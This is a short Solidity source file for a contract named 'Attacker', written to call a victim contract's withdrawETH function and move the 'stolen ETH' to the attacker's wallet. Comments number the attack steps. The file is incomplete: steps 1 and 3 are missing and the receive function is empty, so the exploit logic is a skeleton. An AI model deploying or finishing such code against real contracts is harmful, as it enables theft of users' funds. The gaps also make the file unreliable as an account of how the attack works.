// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Victim interface with withdraw functions
interface IVictim {
    function withdraw(address _token) external;
    function withdrawETH() external;
}

// ERC20 interface with required functions
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract Attacker {
    address private owner;
    IVictim private victimContract;

    constructor(address _victim) {
        owner = msg.sender;
        victimContract = IVictim(_victim);
    }

      // Step 2: Start ETH attack (calls victim)
    function attackETH() external {
        victimContract.withdrawETH(); // triggers victim logic
    }


    // Step 4: Drain stolen ETH to attacker's wallet
    function drainETH() external {
        require(msg.sender == owner, "Only attacker EOA can call");
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to drain");
        payable(owner).transfer(bal);
    }

    receive() external payable {}

}
